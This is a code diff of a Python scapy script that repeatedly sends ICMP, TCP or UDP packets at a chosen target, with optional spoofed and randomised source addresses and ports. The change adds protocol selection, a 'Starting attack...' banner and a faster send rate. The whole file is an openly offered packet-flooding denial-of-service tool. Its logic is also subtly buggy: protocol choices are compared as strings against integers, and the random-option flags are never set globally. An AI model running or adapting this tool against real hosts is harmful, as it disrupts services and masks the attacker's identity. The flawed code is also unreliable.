@@ -1,8 +1,11 @@
 from curses.ascii import isdigit
+# from select import devpoll
 from scapy.all import *
+import time
 
 is_random_ip = False
-is_random_port = False
+is_random_src_port = False
+is_random_dst_port = False
 is_spoof_ip = False
 
 # Check IPv4 format
@@ -76,7 +79,7 @@ def set_source_port():
       src_port = input("Enter Source Port Number:")
       if src_port == "":
          print("-->Set random port")
-         is_random_port = True
+         is_random_src_port = True
          break
 
       if validate_port_number(src_port):
@@ -90,7 +93,7 @@ def set_destination_port():
       dst_port = input("Enter Destination Port Number:")
       if dst_port == "":
          print("-->Set random port")
-         is_random_port = True
+         is_random_dst_port = True
          break
 
       if validate_port_number(dst_port):
@@ -126,8 +129,8 @@ print("----------------------------------------------------------------")
 print("----------------------------------------------------------------")
 print("Do you want to spoof source IP address?")
 print("Please choose:")
-print("0: No")
-print("1: Yes\n")
+print("    0: No")
+print("    1: Yes\n")
 
 spoof_ip = 0
 while True:
@@ -140,18 +143,68 @@ while True:
 
 source_ip = set_source_ip(is_spoof_ip = int(spoof_ip))
 target_ip = set_target_IP()
-source_port = set_source_port()
-destination_port = set_destination_port()
+
+print("Please choose protocol:")
+print("    0: ICMP")
+print("    1: TCP")
+print("    2: UDP\n")
+
+ip_proto = 0
+while True:
+   ip_proto = input("--> You press: ")
+   if (ip_proto.isdigit() == False or (int(ip_proto) != 0 and int(ip_proto) != 1 and int(ip_proto) != 2)):
+      print("Please choose either 0 or 1 or 2!")
+      
+   else:
+      break
+
+if (ip_proto != 0):
+   global source_port
+   source_port = set_source_port()
+   global destination_port
+   destination_port = set_destination_port()
+
+print("Starting attack...")
+time.sleep(3)
 
 while True:
    # source_ip = rand_ip()
    # source_port = rand_port()
-   IP1 = IP(src = source_ip, dst = target_ip)
+
+   if is_random_ip == True:
+      source_ip = rand_ip()
+      IP1 = IP(src = source_ip, dst = target_ip)
+   else:
+      IP1 = IP(dst = target_ip)
+
+   global pkt
+   pkt = IP1 / ICMP()
+
+   if ip_proto != 0:
+      if is_random_src_port == True:
+         source_port = rand_port()
+      
+      if is_random_dst_port == True:
+         destination_port = rand_port()
+
+      if ip_proto == 1:
+         TCP1 = TCP(sport = source_port, dport = destination_port)
+         pkt = IP1 / TCP1
+         # send(pkt, inter = .00001)
+
+      if ip_proto == 2:
+         UDP1 = UDP(sport = source_port, dport = destination_port)
+         pkt = IP1 / UDP1
+         # send(pkt, inter = .00001)
+   else:
+      pkt = IP1 / ICMP()
+      # send(pkt, inter = .00001)
+   
    # TCP1 = TCP(sport = source_port, dport = 80)
    # UDP1 = UDP(sport = source_port, dport = destination_port)
    # pkt = IP1 / TCP1
    # pkt = IP1 / UDP1
-   pkt = IP1 / ICMP()
-   send(pkt,inter = .001)
+   # pkt = IP1 / ICMP()
+   send(pkt, inter = .00001)
    print ("packet sent ", i)
    i = i + 1
